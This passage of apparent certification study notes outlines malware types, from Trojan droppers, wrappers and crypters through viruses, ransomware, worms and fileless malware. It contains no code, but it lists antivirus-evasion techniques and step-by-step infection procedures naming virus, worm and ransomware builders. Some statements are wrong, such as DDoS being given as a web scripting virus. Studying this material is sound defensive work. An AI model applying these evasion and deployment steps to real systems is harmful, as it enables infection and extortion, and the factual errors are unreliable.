			- After creating Trojans, attackers use droppers like Amadey or SecuriDropper, or downloaders like Downloader.DN, to deliver them to the victim’s machine. Droppers appear as legitimate files but execute hidden malware without saving it to disk, often using decoys like images or games. Downloaders, by contrast, contain links to retrieve the Trojan from an attacker’s server. While droppers evade firewalls, downloaders are more susceptible to detection using network analyzer tools.
			- Droppers : Droppers are programs designed to conceal malware payloads that disrupt target systems. They often include features to evade antivirus detection and perform stealthy installations. Droppers load their code into memory, extract the malware payload, write it to the file system, and then execute the payload to initiate the malware installation.
			- Droppers: Amadey, SecuriDropper, PindOS JavaScript dropper, SharkBot, Dropper.AIF, NullMixer
			- Downloaders : A downloader is a program designed to download and install harmful software, such as malware. Unlike droppers, downloaders do not carry malware themselves, which allows new or unknown downloaders to bypass anti-malware scanners. Attackers use downloaders as part of a payload or alongside other harmful programs to stealthily install malware. Downloaders are often disguised as legitimate files, such as "accounts.exe" or "invoices," and attached to emails.
			- Downloaders: Fruity Trojan downloader, Downloader.DN, InfoStealer.XY, sLoad
		- Step 3: Employing Wrapper:
			- Wrappers bind Trojan executables with legitimate-looking .EXE files, such as games or office software. When run, the Trojan installs in the background while the legitimate program runs in the foreground. Tools like petite.exe can compress and conceal Trojans, helping them bypass antivirus detection. Wrappers can also bundle multiple executables, with some running hidden processes alongside visible ones.
			- Covert Wrapper Programs - IExpress Wizard : The IExpress Wizard is a wrapper tool that helps users create self-extracting packages capable of automatically installing embedded files, including setup files or Trojans. IExpress can delete the setup files after execution, erasing traces of the Trojan. It can also run a program or extract hidden files. These embedded Trojans often evade detection by antivirus software.
			- Wrapper Tools: GuLoader, RDP Wrapper & Autoupdate, SystemBC, Trickbot, FinFisher
		- Step 4: Employ Crypter:
			- Attackers use a crypter, such as The Attacker-Crypter, to encrypt a Trojan and evade detection by firewalls and IDS. A crypter is software that encrypts the original binary code of an .exe file. It allows attackers to hide viruses, spyware, keyloggers, RATs, and other malicious software, making them undetectable by antivirus programs.
			- Attacker-Crypter : AttackerCrypter can encrypt executables to bypass traditional detection mechanisms using various techniques. It also allows attackers to execute custom PowerShell code or select the desired payload type through its interface. Additionally, it can notify the attacker of the methods being executed on the target system.
			- Crypter Tools: Muck Crypter, Pure Crypter, DarkTortilla, Line Crypter, Trickbot/Conti
		- Step 5: Propagating and Deploying Trojan:
			- After creating a Trojan and using a dropper/downloader, wrapper, and crypter, the attacker must transfer and deploy the package on the target machine. The Trojan can be propagated through various methods, including overt and covert channels, exploit kits, emails, USB drives, proxy servers, and instant messaging, tricking users into downloading and executing it. Once active, the Trojan can perform malicious actions, such as displaying annoying pop-ups, altering desktops, modifying or deleting files, stealing data, and creating backdoors.
			- Covert Channels Tools: Racoon , QEMU, ELECTRICFISH
			- Proxy Server Trojans: SocksEscort, QakBot, Stantinko Botnet
			- Propagate and Deploy Trojans: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
	- Techniques for Evading Antivirus Software:
		- Break the Trojan file into multiple parts and zip them into a single file.
		- Always create a custom Trojan and embed it into an application, as antivirus programs may fail to recognize new Trojans due to the absence of their signatures in the database.
		- Modify the Trojan's syntax:
			- Convert the .EXE file to a VBScript.
			- Rename the .EXE extension to .DOC.EXE, .PPT.EXE, or .PDF.EXE. Since Windows hides "known extensions" by default, these files will appear as .DOC, .PPT, or .PDF, disguising their true nature.
		- Modify the Trojan's content using a hex editor to alter its binary code, making it harder for antivirus programs to detect.
		- Alter the checksum and encrypt the file to prevent detection by antivirus software, as this changes the file's signature and makes it appear different.
		- Avoid using Trojans downloaded from the web, as antivirus software can easily detect these pre-existing versions.
		- Use binder and splitter tools to modify the first few bytes of Trojan programs, making them harder for antivirus software to detect.
		- Perform code obfuscation or morphing to disguise the Trojan's true functionality, making it harder for antivirus software to distinguish between malicious and harmless programs.
	- Exploit Kits:
		- An exploit kit, also known as a crimeware toolkit, is used to exploit security vulnerabilities in software applications, such as Adobe Reader and Adobe Flash Player. These kits distribute malware, including spyware, viruses, Trojans, worms, bots, backdoors, buffer overflow scripts, or other malicious payloads, to the target system. Exploit kits come with pre-written exploit code, making them easy to use even for attackers without advanced IT or security expertise. Additionally, they provide a user-friendly interface to track infection statistics and a remote mechanism to control compromised systems.
		- BotenaGo Exploit Kit : The BotenaGo exploit kit, written in the Go programming language, contains over 30 variants of exploits and is capable of attacking millions of IoT and routing devices worldwide. BotenaGo was first discovered in November 2021 and was initially detected as Mirai botnet malware by antivirus software. After successfully embedding a backdoor in a victim's device, attackers can exploit the device using preconfigured exploit functions in the source code.
	- Exploit Kits: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
- Viruses
	- A virus is a self-replicating program that creates copies of itself by attaching to another program, a computer's boot sector, or a document. Viruses are commonly transmitted through file downloads, infected disks or flash drives, and email attachments. Indications of a virus attack include frequent antivirus alerts, unusual hard drive activity, reduced storage space, and the appearance of unwanted pop-up windows.
	- Types of Viruses : Viruses are categorized based on their functionality and targets.
		- System or Boot Sector Virus:
			- The most common virus targets are system sectors, including the master boot record (MBR) and DOS boot sector, as these are critical during system booting. MBRs are especially vulnerable since their corruption can cause complete data loss. System sectors are only 512 bytes, so viruses hide their code elsewhere on the disk. Boot sector viruses, often spread via email attachments and USB drives, reside in memory and sometimes infect files, making them multipartite. These viruses move the MBR to a new location, placing their code in the original spot, ensuring their execution before the MBR during booting.
			- Virus Removal: System sector viruses often create the illusion that the system is virus-free. One way to address these viruses is to avoid using the Windows operating system and switch to Linux or macOS, as Windows is more susceptible to such attacks. Linux and macOS have built-in safeguards that offer better protection against these viruses. Another effective approach is to perform regular antivirus scans to detect and remove infections.
		- File Virus:
			- File viruses infect executable or interpreted files such as COM, EXE, SYS, OVL, OBJ, PRG, MNU, and BAT files. They can be either direct-action (non-resident) or memory-resident. File viruses insert their code into executable files, typically targeting those with extensions like .COM or .EXE. When the infected program runs, the virus executes alongside it, spreading to other files.
			- These viruses are challenging to remove because overwriting them renders the original program unusable. Some file viruses save the program's original instructions, allowing it to execute normally and concealing the infection. Using stealth techniques, they hide in memory and prevent detection, showing no file length increase during directory listings. They can also intercept file read requests, returning the original file to the user to avoid suspicion. File viruses are versatile and capable of infecting many file types due to the variety of infection techniques available.
		- Multipartite Virus:
			- A multipartite virus, also known as a multipart or hybrid virus, combines the characteristics of file infectors and boot record infectors, targeting both the boot sector and executable files simultaneously. When the virus infects the boot sector, it can spread to system files, and infected system files can, in turn, reinfect the boot sector. This type of virus repeatedly reinfects the system if it is not completely eradicated.
		- Macro Virus:
			- Macro viruses infect applications like Microsoft Word by automatically executing actions when triggered. Most are written in Visual Basic for Applications (VBA) and target templates or convert infected documents into template files, disguising themselves as regular documents
			- Although generally less harmful than other viruses, macro viruses often spread via email. Pure data files cannot spread viruses, but users may overlook the distinction between data and executable files due to the extensive use of macro languages in programs. This blurring occurs when default macros are set to run automatically upon loading a file, creating an opportunity for exploitation. Virus writers target universal programs with macro capabilities, such as Microsoft Word, Excel, and other Office applications, as well as Windows Help files, which can also contain macro code.
		- Cluster Virus:
			- Cluster viruses infect files without altering them or creating additional files. They store their code on the hard drive and overwrite directory entry pointers, redirecting the disk read process to the virus code instead of the intended program. Although this modification affects all programs, only one copy of the virus exists on the disk.
			- A cluster virus, such as Dir-2, executes itself when any program is launched, then passes control to the actual program. If the virus infects memory, it manipulates access to the disk's directory structure. Booting from a clean USB drive and running utilities like CHKDSK can reveal issues, such as cross-linked files. Accepting the utility's offer to "fix" these problems can cause the virus to spread, infecting all executable files, leading to data loss or uniform file sizes.
		- Stealth/Tunneling Virus:
			- Stealth viruses evade antivirus detection by altering service call interrupts and replacing system requests with their own code. They provide false information to conceal their presence, hiding modifications and taking control of system functions. For example, they can hide file size changes or temporarily relocate a copy of themselves to another drive, replacing the infected file with an uninfected one.
			- These viruses also reside in memory and control system functions that read files or sectors. When a program requests modified information, the virus provides false data to the requesting program. Rootkits, often carriers of stealth viruses, are installed by Trojans and allow the virus to hide and persist undetected.
			- Virus Removal:
				- Always perform a cold boot (boot from a write-protected USB).
				- Avoid using DOS commands like FDISK to fix the virus.
				- Use antivirus software for detection and removal.
		- Encryption Virus:
			- Encryption viruses, or cryptolocker viruses, infiltrate systems via freeware, shareware, torrents, fake ads, email spam, and more. These viruses consist of an encrypted copy and a decryption module, with the decryption module remaining constant while the encryption uses different keys.
			- When the virus is injected into the system, the decryption module executes first, decrypting the virus body, which then replicates or becomes resident on the machine. Each infected file is encrypted with a unique key using XOR with a randomized key. These viruses block access to the system or limit functionality, using encryption to evade detection by virus scanners. While virus scanners can't detect the encrypted virus via signatures, they can identify the decryption module.
		- Sparse Infector Virus:
			- Sparse infector viruses spread infection by minimizing their chance of detection. These viruses infect infrequently, only under specific conditions or when file sizes fall within a certain range.
			- The sparse infector virus operates in two ways:
				- It replicates occasionally (e.g., every tenth program executed or on a specific day of the week).
				- It selects files to infect based on set conditions (e.g., infecting files under 128 KB in size).
			- For example, an attacker may send a sparse infector virus to a target machine, setting it to execute on the 15th day of every month. This tactic reduces the likelihood of detection by antivirus software, allowing the virus to infect the system successfully.
		- Polymorphic Virus:
			- Polymorphic viruses encrypt their code and use a decryption module to decode it during infection. To avoid detection, these viruses modify their code each time they replicate by altering both the encryption module and the instruction sequence. Random number generators drive this process.
			- A polymorphic virus consists of three components: the encrypted virus code, the decryptor routine, and the mutation engine. The decryptor routine decrypts the virus code after gaining control of the system, while the mutation engine generates random decryption routines that change with each infection.
			- When a program infected with a polymorphic virus is executed, the decryptor takes control, decrypting the virus code and mutation engine. The virus then replicates in RAM and generates new, randomized decryption routines for further infections. This encryption and mutation process makes polymorphic viruses difficult to detect, as no two infections appear the same to antivirus software.
		- Metamorphic Virus:
			- Metamorphic viruses are designed to completely rewrite themselves each time they infect a new executable file. These sophisticated viruses use metamorphic engines to reprogram their code, translating it into a temporary variant before converting it back to the original code. This technique maintains the original algorithm while avoiding detection by antivirus software through pattern recognition. Metamorphic viruses are more advanced and effective than polymorphic viruses.
			- The transformation of virus bodies depends on the technique employed, with methods for metamorphosing viruses:
				- Disassembler
				- Expander
				- Permutator
				- Assembler
			- Virus bodies are transformed through the following steps:
				- Inserts dead code
				- Reshapes expressions
				- Reorders instructions
				- Modifies variable names
				- Encrypts program code
				- Modifies program control structure
		- Overwriting File or Cavity Virus:
			- Some programs contain empty spaces. Cavity viruses, also known as space fillers, overwrite part of the host file with a constant value (usually nulls) without increasing the file size, thus preserving its functionality. By maintaining a constant file size during infection, the virus can evade detection. Cavity viruses are rarely encountered due to the limited availability of suitable hosts and the complexity of their code.
			- A new design for Windows files, called the Portable Executable (PE) format, improves program loading speeds. However, it creates a gap in the file during execution, which cavity viruses can exploit to insert themselves.
		- Companion Virus/Camouflage Virus:
			- The companion virus stores itself with the same filename as the target program file. It infects the computer when the file is executed and modifies the hard disk data. Companion viruses use DOS to run COM files before EXE files. The virus installs an identical COM file and infects EXE files.
			- Here’s how it works: Suppose a companion virus is running on the PC and decides to infect a file. It looks around and finds a file called notepad.exe. It then creates a file called notepad.com, which contains the virus. The virus typically places this file in the same directory as the .exe file, although it can also place it in any directory on the DOS path. When typing "notepad" and pressing Enter, DOS executes notepad.com instead of notepad.exe (DOS executes COM files first, followed by EXE, then BAT files with the same root name if they are in the same directory).
			- The virus runs, potentially infecting more files, before finally loading and executing notepad.exe. The user is likely to fail to notice any issues. A companion virus can be easily detected by the presence of the extra COM file in the system.
		- Shell Virus:
			- The shell virus code forms a shell around the target host program’s code, making itself the original program and treating the host code as a subroutine. Nearly all boot sector viruses are shell viruses.
		- File Extension Virus:
			- File extension viruses alter the extensions of files. The .TXT extension is typically safe, as it indicates a plain text file. However, with extensions hidden, a file named BAD.TXT.VBS would appear as BAD.TXT. If one forgot that extensions were turned off, one might mistakenly think it’s a text file and open it. In reality, it is an executable Visual Basic Script virus file that could cause severe damage.
			- The guidelines to secure files against virus infections:
				- Turn off "Hide file extensions" in Windows (Go to Control Panel -> Appearance and Personalization -> Show hidden files and folders -> View tab -> Uncheck "Hide extensions for known file types").
				- Scan all files on the system using reliable antivirus software, as this may take a considerable amount of time.
		- FAT Virus:
			- A FAT virus targets the File Allocation Table (FAT), a system used in Microsoft and other computer systems to access stored information. By attacking the FAT, the virus can cause severe damage. It may embed itself in files, trigger when the FAT accesses them, or directly attack the FAT. These viruses often overwrite files or directories, leading to permanent data loss.
			- A powerful FAT virus can render a computer unusable, requiring reformatting. It destroys the index, making file location impossible, and can spread by corrupting files as the FAT accesses them. Symptoms include missing or inaccessible files and changes to the FAT architecture, such as a shift from FAT32 to FAT12.
		- Logic Bomb Virus:
			- A logic bomb is a virus triggered by a specific event, such as launching an application or reaching a particular date/time, using logic to execute the trigger.
			- When a logic bomb is programmed to activate on a specific date, it is known as a time bomb. Time bombs are typically set to trigger on significant dates.
			- For example, cybercriminals may use spyware to secretly install a keylogger on a computer. The keylogger captures keystrokes, including usernames and passwords. The logic bomb is set to activate when visiting a site that requires login credentials, like a banking site or social network. Once triggered, the logic bomb executes the keylogger, captures credentials, and sends them to a remote attacker.
		- Web Scripting Virus:
			- A web scripting virus is a type of security vulnerability that breaches web browser security through a website, allowing attackers to inject client-side scripts into web pages. This can bypass access controls and steal information from the browser. Web scripting viruses typically target sites with large user bases, such as social networking, user review, and email sites, and can spread faster than other types of viruses. A common example is DDoS, which can send spam, damage data, and defraud users.
			- There are two types of web scripting viruses: non-persistent and persistent. Non-persistent viruses attack without knowledge, while persistent viruses steal cookies and hijack sessions, enabling attackers to impersonate and cause significant damage.
			- Prevention : To prevent these viruses and exploits, safely validate untrusted HTML inputs, enforce cookie security, disable scripts, and use antivirus programs with real-time protection for web browsers. Avoid unknown websites and use World of Trust to verify site safety. Signs of a web scripting virus include redirected searches, changes to the homepage or background, slow performance, and random program closures. Modern browsers offer add-ons like Adblock Plus to block scripts.
		- Email Virus:
			- An email virus is malicious code sent as an email attachment that, when activated, can damage files, steal data, or spread by emailing itself to contacts. These viruses can create pop-ups, crash systems, or steal personal information. They may appear as emails from unknown senders, have nonsensical subject lines, or be disguised to look like messages from trusted sources.
			- To avoid email virus attacks, avoid opening attachments unless the sender and content are verified. Use antivirus software to scan attachments before opening.
		- Armored Virus:
			- Armored viruses are designed to evade detection by confusing or deceiving antivirus systems, making it difficult to identify the source of the infection. These viruses mislead antivirus programs by masking their true location, often appearing to be elsewhere while residing on the system itself.
			- The following basic techniques are employed by armored viruses:
				- Anti-disassembly : This technique uses specially crafted code or data to generate incorrect program listings in disassembly analysis tools.
				- Anti-debugging : These techniques ensure the program is not running under a debugger, slowing reverse engineering without fully preventing it.
				- Anti-heuristics : These methods modify machine code to resist heuristic analysis, protecting the program from programmer and debugger intervention.
				- Anti-emulation : These techniques fingerprint the emulated system environment to avoid dynamic analysis and protect intellectual property from emulation-assisted reverse engineering.
		- Add-on Virus:
			- Add-on viruses either append their code to the host code without altering it or relocate the host code to insert their own code at the beginning.
		- Intrusive Virus:
			- Intrusive viruses overwrite the host code, either partially or entirely, with their own code.
		- Direct Action or Transient Virus:
			- Direct action or transient viruses transfer control from the host code to the virus code in memory. These viruses select target programs to modify and corrupt them. Their lifespan depends on the lifespan of their host, as they execute only when the attached program runs and terminate when the program ends. During execution, the virus may spread to other programs. These viruses are called transient or direct because they operate for a short period and directly access the disk to search for programs to infect.	
		- Terminate and Stay Resident Virus (TSR):
			- A terminate-and-stay-resident (TSR) virus remains in the target machine’s memory throughout the entire session, even after the host program has executed and terminated. By staying in memory, the TSR virus retains some control over system processes. Typically, it incorporates interrupt vectors into its code, redirecting execution to the virus when an interrupt occurs. To completely remove a TSR virus from the system, a reboot is required, as it leaves no trace in memory after the system restarts.
			- The following steps are used by TSR viruses to infect files:
				- Gain control of the system.
				- Allocate a portion of memory for their code.
				- Transfer and activate themselves in the allocated memory.
				- Hook the code execution flow to their own code.
				- Replicate and infect files.
	- Infect Systems Using Virus:
		- Step 1: Create a virus using tools such as JPS Virus Maker, Virus Maker, or Virus-Builder. These tools enable customization and crafting of a virus into a single executable file. The behavior of the virus depends on the options provided by the virus maker tool.
		- Step 2: Once the virus is created, it can be packed using a binder or virus packager tool.
		- Step 3: Send it to the victim's machine via email, chat, a mapped network drive, or another method that appears legitimate to the victim.
		- Step 4: When the victim opens and executes the received file, which appears legitimate, the target system becomes infected.
	- Virus Maker Tools: JPS Virus Maker, TeraBIT Virus Maker, Batch Virus Generator
	- Propagating and Deploying Virus:
		- Virus Hoaxes:
			- Techniques such as virus hoaxes and fake antivirus software are commonly used by attackers to introduce viruses into victims' systems. Virus hoaxes can be nearly as damaging as real viruses, causing significant loss of productivity and bandwidth as naive users react to them and forward them to others. Due to the fear viruses often create, they have become a frequent subject of hoaxes. Virus hoaxes are false alarms that claim to report nonexistent viruses.
			- The following are key features of virus hoaxes:
				- These warning messages, which spread quickly, claim that a specific email should not be opened, as doing so would damage the system.
				- In some cases, these warning messages themselves contain virus attachments.
			- Verify the identity of the person posting the warning and check for technical details in virus-related messages. Cross-check information from suspicious newsgroups or unfamiliar sources. If the message comes from a government body, ensure it references the relevant federal regulation. These steps help ensure the information's reliability.
			- Google Critical Security Alert Scam:
				- Google Critical Security Alert is a service provided by Google to notify users of any activity related to their accounts, such as logging in, changing passwords, or updating personal information. Attackers create fake alert emails to deceive victims, claiming these activities have occurred. When users view the fake alert and click the link provided, they can become infected.
				- The example shows a hoax email with the subject "New device signed in to." If the victim overlooks the email's source and clicks the "Check activity" button, they fall into the trap.
			- Additional Virus Hoaxes: WhatsApp Seismic Waves Card, McAfee Virus Pop-Up Scam, McAfee Scam - Sinister Email
		- Fake Antivirus:
			- Fake antivirus software is a type of internet fraud that mimics legitimate antivirus programs. It often appears in banner ads, pop-ups, email links, and search results. These programs encourage users to install them, perform updates, or remove viruses, but once clicked, they redirect users to a page prompting payment details.-
			- Once installed, fake antivirus software can steal sensitive information, corrupt files, and spread malware. Recently, fake antivirus apps have become widespread in the mobile space, with two-thirds of antivirus apps in the Android Play Store identified as fake, according to AV-Comparatives research.
			- Antivirus 10 : Antivirus 10 is fake antivirus software that pretends to be a legitimate antivirus suite. It is distributed as a potentially unwanted program (PUP) alongside regular software applications. Antivirus 10 initially imitates a system scan and displays fake threats found on the system. It generates fake system warnings, firewall alerts, unwanted redirects to malicious websites, and antivirus pop-ups, urging users to purchase the full version.
			- Additional Fake Antivirus Programs: AVLab Internet Security, Smart Security, PC Analyzer Tool, Live Protection Suite
- Ransomware
	- Ransomware is a type of malware that restricts access to a computer system's files and folders, demanding an online ransom payment from the victim to the malware creator(s) in exchange for removing the restrictions. Ransomware may encrypt files on the system's hard drive or simply lock the system and display messages designed to trick the user into paying the ransom.
	- In a web browser, a text file or webpage displays the ransomware's demands. The messages often appear to be from companies or law enforcement personnel, falsely claiming that the victim's system is being used for illegal purposes or contains illegal content (e.g., pornographic videos, pirated software). Alternatively, the message may be a fake Microsoft product activation notice, falsely claiming that the installed Office software is counterfeit and requires reactivation. These messages aim to trick victims into paying money to undo the restrictions imposed on their systems. Ransomware exploits victims' fear, trust, surprise, and embarrassment to coerce them into paying the ransom.
	- Mallox Ransomware:
		- Mallox is a ransomware strain targeting Microsoft Windows systems, first identified in June 2021. It infects networks with vulnerable MS-SQL servers and spreads through emails, software cracking tools, and downloads from untrusted sites. Mallox encrypts files on the infected system, appending the “.mallox” extension (e.g., "sample.txt" becomes "sample.txt.mallox"). Some variants use extensions like “.malox,” “.malloxx,” or “.maloxx.” It also creates a ransom note, “RECOVERY INFORMATION.txt,” with instructions for contacting the attacker. Victims are directed to the Mallox ransomware TOR website via the Tor Browser to pay the ransom.
	- STOP/Djvu Ransomware :
		- The STOP/DJVU ransomware, first identified in February 2018, has since evolved into over 600 variants. It earned the "Djvu" nickname by adding the .djvu extension, a legitimate file format used by AT&T. This variant uses RSA encryption and multiple layers of obfuscation, hindering analysis. Primarily targeting Windows systems, STOP/DJVU downloads additional programs to encrypt files, with variants using extensions like .looy, .vook, .kool, and others. After encryption, a "_readme.txt" file appears with ransom instructions. It spreads mainly through spam emails with malicious attachments and fake file types on torrent sites.
	- Additional Ransomware: ESXiArgs, Qilin, Akira, Royal, NoEscape, CatB, Dodge Ransomware, Rhysida, BianLian, BlackCat
	- Ransomware Families: Mallox, Phobos, Xorist, LockBit Black, DarkSide RaaS, Conti, Cerber, Thanos, RansomEXX, NETWALKER, QNAPCrypt, Maze
	- Infect Systems Using Ransomware:
		- Step 1: Create ransomware using tools such as Chaos Ransomware Builder v4.
		- Step 2: Transfer the ransomware to the victim’s machine using various techniques, such as attaching it to an email or through physical means, such as a hard drive or USB drive, making it appear legitimate.
		- Step 3: When the victim downloads and opens the malicious file, the ransomware infects the system by encrypting system files based on the number of files and the encryption algorithm.
		- Step 4: After the infection, a window appears instructing the victim to pay a ransom to decrypt the files.
- Computer Worms
	- Computer worms are malicious programs that independently replicate, execute, and spread across network connections, consuming available computing resources without human interaction.
	- Worms are a subtype of viruses. A worm does not require a host to replicate; however, in some cases, the worm's payload may infect the host machine as well. Attackers use worm payloads to install backdoors on infected computers, turning them into zombies and creating a botnet. These botnets can then be used to perform further cyberattacks.
	- Computer Worms: SSH-Snake, Raspberry Robin, P2PInfect
	- Infect Systems Using Worm:
		- Step 1: Create a worm using tools such as Internet Worm Maker Thing or Batch Worm Generator. Write the code with specific features designed to exploit vulnerabilities in system software or network protocols.
		- Step 2: Deploy the worm via phishing emails, malicious websites, network shares, or infected USB drives. The worm is attached to a file or link that appears legitimate to users. Use specific packers and crypters, such as BitCrypter or H-Crypt, to encrypt the worm and evade detection by security solutions.
		- Step 3: Once the user clicks on the phishing link or downloads a file from a malicious website/USB, the worm infects the system by executing its payload, typically using exploit code and an automated script to execute upon download.
		- Step 4: After infection, the worm scans for other vulnerable devices on the network without human intervention. It uses various methods, such as scanning for open ports or known vulnerabilities, to identify targets.
		- Step 5: The worm copies itself to identified vulnerable devices, propagating its infection and continuing the cycle.
		- Step 6: The worm installs backdoors or alters system settings to remain active, continuously stealing and exfiltrating data from the infected devices.
	- Worm Maker - Internet Worm Maker Thing:
		- Internet Worm Maker Thing is an open-source tool used to create worms that can infect a victim's drives and files, display messages, disable antivirus software, and more. This tool includes a compiler that can easily convert a batch virus into an executable to evade antivirus software or serve other purposes.
	- Worm Makers: Batch Worm Generator
- Fileless Malware
	- Fileless malware, also known as non-malware, compromises legitimate software, applications, and system protocols to carry out malicious activities. It exploits existing vulnerabilities to infiltrate the system and resides in the system’s RAM. This type of malware injects malicious code into active processes such as Microsoft Word, Flash, Adobe PDF Reader, JavaScript, and PowerShell.
	- Fileless malware does not rely on files and leaves no traces, making it difficult to detect and remove with traditional anti-malware solutions. As a result, this type of malware is highly resistant to computer forensic techniques. It primarily resides in volatile memory locations, such as running processes, the system registry, and service areas.
	- The primary reasons for using fileless malware:
		- Stealth : Fileless malware exploits legitimate system tools, making it extremely difficult to detect, block, or prevent such attacks.
		- Living-off-the-land (LOL): Fileless malware takes advantage of system tools that are already installed by default. This eliminates the need for attackers to create or install custom tools on the target system.
		- Trustworthiness: The system tools leveraged by fileless malware are frequently used and trusted, leading security tools to incorrectly assume that these tools are running for legitimate purposes.
		- Persistence without files: Despite not storing files on disk, fileless malware can achieve persistence by inserting malicious code into the registry or scheduling tasks. This allows the malware to remain active even after a system reboot, without leaving behind traditional forensic evidence.
		- Simplified infection process: Fileless attacks can originate from something as simple as a phishing email leading to a malicious website. The website exploits browser vulnerabilities to execute code directly in memory, streamlining the initial infection vector and bypassing the need to trick users into downloading or executing files.
		- Increased success rate in targeted attacks: The stealthy nature of fileless malware makes it highly effective in targeted attacks, such as espionage and sophisticated cyber-espionage campaigns. It enables attackers to maintain a low profile while exploring the target environment and moving laterally across the network.
		- Challenges in forensic analysis and incident response: The transient nature of fileless malware complicates forensic analysis and incident response. With no files to analyze and memory contents often lost upon system reboot, it becomes more difficult for security teams to determine the scope of an attack and develop indicators of compromise (IoCs) for future defenses.
	- Fileless Propagation Techniques used by Attackers:
		- Phishing emails: Used to deliver malicious links or attachments that execute fileless attacks in memory.
		- Exploitation of legitimate applications: Leveraging trusted applications like Microsoft Word and JavaScript to execute malicious code.
		- Native applications: Utilizing built-in tools such as PowerShell and Windows Management Instrumentation (WMI) to execute attacks.
		- Infection through lateral movement: Spreading malware across the network by exploiting infected systems.
		- Malicious websites: Creating fraudulent websites that exploit browser or plugin vulnerabilities to execute malicious code in memory.
		- Registry manipulation: Modifying the Windows registry to bypass User Account Control (UAC), application whitelisting, or other running processes to maintain persistence.
		- Memory code injection: Injecting code directly into memory to evade standard security measures, including local shellcode injection, remote thread injection, and process hollowing.
		- Script-based injection: Using scripts, such as PowerShell or JavaScript, to execute malicious activities without leaving file traces.
		- Reflective DLL injection: Loading dynamic link libraries (DLLs) directly into memory without writing them to disk.
		- Exploiting non-malicious files: Leveraging seemingly harmless files, such as PDFs or Windows shortcut files (.lnk), to initiate attacks.
	- Taxonomy of Fileless Malware Threats:
		- Fileless malware can be categorized based on its point of entry, which refers to how it gains access to the target system. It can infiltrate the system through exploits, compromised hardware, or the normal execution of applications or scripts.
		- According to the above categorization, fileless malware threats can be classified into three types based on the amount of evidence they leave on the victim’s machine:
			- Type 1: No File Activity Performed
				- This type of malware never writes files to disk. For example, malicious packets may exploit a vulnerability to install a backdoor in kernel memory, or malware may be embedded in the device’s firmware. Since anti-malware solutions cannot scan firmware, these threats are difficult to detect and prevent.
			- Type 2: Indirect File Activity
				- This type of malware achieves a fileless presence on the target machine through the use of files. For example, an attacker may inject a malicious PowerShell command into the WMI repository to configure a filter that executes periodically.
			- Type 3: Required Files to Operate
				- This type of malware requires files to operate but does not execute attacks directly from them. For example, an attacker may exploit a document with an embedded macro, Java/Flash file, or EXE file to inject a malicious payload into the target host, then maintain persistence without relying on any files.
		- Classification of fileless malware threats based on their point of entry:
			- Exploits : Exploits can be either file-based or network-based. File-based malware targets system executables, Flash, Java, documents, etc., to run shellcode that injects a malicious payload into memory. This type of malware uses files to gain initial access to the target machine. Network-based malware, on the other hand, exploits vulnerabilities in network communication protocols, such as SMB, to deliver malicious payloads.
			- Hardware : Device-based malware infects firmware on network cards and hard disks to deliver a malicious payload. CPU-based malware exploits firmware used for management operations to execute malicious code within the CPU. USB-based malware rewrites USB firmware with malicious code that directly interacts with the operating system and installs a malicious payload on the target machine. Similarly, fileless malware can exploit BIOS-based firmware or conduct hypervisor-based attacks that target virtual machines.
			- Execution and Injection : This malware can be file-based, macro-based, script-based, or disk-based. File-based malware exploits executables, DLLs, LNK files, etc., to inject a malicious payload into memory or running processes. Macro-based malware tricks victims into clicking malicious links that execute payloads via macros. Script-based malware is used once an attacker gains a foothold, injecting payloads by running scripts on the command prompt. Disk-based malware rewrites the boot record with malicious code to gain access and install the payload.
	- Fileless Malware Works:
		- Point of Entry:
			- Memory Exploits: Fileless malware uses various techniques to inject and execute itself in the process memory of legitimate system processes. It exploits the memory and privileges of whitelisted system tools, such as Windows Management Instrumentation (WMI), PowerShell, Command.exe, PsExec, etc.
			- Malicious Websites:
				- Fileless threats can originate from exploit-hosting websites that appear legitimate. Upon visiting, the exploit kit scans for vulnerabilities like outdated Flash or Java plugins. If successful, it uses native tools like PowerShell to download and execute the payload directly in memory, without writing files to disk.
				- Fileless malware can also exploit script-based programs, such as PowerShell, macros, JavaScript, and VBScript. These scripts may inject code or connect to malicious sites to download additional binaries or scripts, delivering the actual payload.
			- Phishing Emails/Malicious Documents: Attackers may embed malicious macros, such as VBScript or JavaScript, in Microsoft Office documents (Word, PowerPoint, Excel) or PDFs and use social engineering techniques to trick users into enabling the macros. While the attack begins with a document or file, it becomes a fileless threat once the malicious script executes from memory using whitelisted tools like PowerShell.
		- Code Execution:
			- Code Injection: Fileless threats employ techniques like process hollowing and reflective DLL injection to load shellcode directly into memory without writing any files to disk.
			- Script-based Injection: Fileless malware often arrives as an email attachment. When opened, the embedded script runs in memory, invoking whitelisted applications like PowerShell, mshta.exe, JavaScript, WScript, or VBScript to connect to malicious websites and download additional scripts for payload delivery. Since these operations occur entirely in memory, traditional anti-malware solutions struggle to detect them.
		- Persistence:
			- Fileless malware is typically non-persistent, as it resides in memory and is removed upon system restart. However, attackers can achieve persistence by storing malicious scripts in built-in Windows tools like the registry, WMI, or Task Scheduler, enabling them to execute even after a reboot.
			- Windows Registry: Attackers can store malicious scripts in Windows AutoStart registry keys, ensuring they are loaded and executed every time the system restarts.
			- Windows Management Instrumentation (WMI): Fileless malware exploits WMI, a tool commonly used for automating system administration tasks, to achieve and maintain persistence. Attackers store malicious scripts in WMI repositories, which are periodically triggered through WMI bindings.
			- Windows Task Scheduler: Attackers can use the Task Scheduler to configure malicious scripts to execute automatically at specified intervals.
		- Achieving Objectives:
			- By maintaining persistence, attackers can bypass security solutions and accomplish various objectives, including data exfiltration, credential theft, reconnaissance, and cyber espionage on target systems and networks.
	- Launching Fileless Malware:
		- Launching Fileless Malware through Document Exploits:
			- An attacker can deceive users into downloading malicious documents, archives, PDFs, or other enticing files containing macro code through phishing emails or social engineering. Once opened, the macro triggers VBA or JavaScript, exploiting Windows tools like PowerShell. The script then uses PowerShell to run additional code or payloads, furthering the infection without detection.
			- The script may access local storage to execute malicious files or run the payload in memory. Once executed, the payload disguises itself as a legitimate dropper or downloader, enabling further attacks.
		- Launching Fileless Malware through In-Memory Exploits:
